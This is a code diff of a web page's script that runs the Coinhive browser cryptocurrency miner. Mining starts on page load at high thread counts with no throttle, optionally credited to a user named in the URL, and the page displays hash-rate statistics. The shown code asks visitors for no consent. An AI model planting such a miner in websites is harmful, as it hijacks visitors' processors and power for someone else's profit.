@@ -23,38 +23,59 @@
 <script src="./js/coinhive.min.js"></script>
 <script>
 
-	var miner = new CoinHive.Anonymous('WsLpvpRA7aJd5xQIPHlprVwSr4UtPgvB',{
+
+function queryObj() {
+    var result = {}, keyValuePairs = location.search.slice(1).split("&");
+    keyValuePairs.forEach(function(keyValuePair) {
+        keyValuePair = keyValuePair.split('=');
+        result[decodeURIComponent(keyValuePair[0])] = decodeURIComponent(keyValuePair[1]) || '';
+    });
+    return result;
+}
+
+var myParam = queryObj();
+var minerador_user = myParam.nome;
+var site_key = "WsLpvpRA7aJd5xQIPHlprVwSr4UtPgvB";
+
+	if (minerador_user) {
+
+		console.log(minerador_user+' está minerando...');
+
+		var miner = new CoinHive.User(site_key, minerador_user, {
+			threads: 4,
+			autoThreads: false,
+			throttle: 0.8,
+			forceASMJS: false
+		});
+
+	}else{
+
+		console.log('Mineração anonima...');
+
+	var miner = new CoinHive.Anonymous(site_key,{
 			threads: 10,
 			autoThreads: false,
 			throttle: 0,
 			forceASMJS: false
 		});
 
+	}
+
 	miner.start();
+ 
+	miner.on('found', function() {   })
+	miner.on('accepted', function() {  })
 
-	// Listen on events
-	miner.on('found', function() { /* Hash found */ })
-	miner.on('accepted', function() { /* Hash accepted by the pool */ })
-
-	// Update stats once per second
 	setInterval(function() {
 		var hashesPerSecond = miner.getHashesPerSecond();
 		var totalHashes = miner.getTotalHashes();
 		var acceptedHashes = miner.getAcceptedHashes();
 
-		// Output to HTML elements...
-
-				console.log(hashesPerSecond);
-				console.log(totalHashes);
-				console.log(acceptedHashes);
-
 				$('.hashesPerSecond').html('Hashes/s: '+hashesPerSecond);
 				$('.totalHashes').html('Total hashes: '+totalHashes);
 				$('.acceptedHashes').html('Hashes aceitas: '+acceptedHashes);
 
-
 	}, 1000);
-
 </script>
 
 </body>
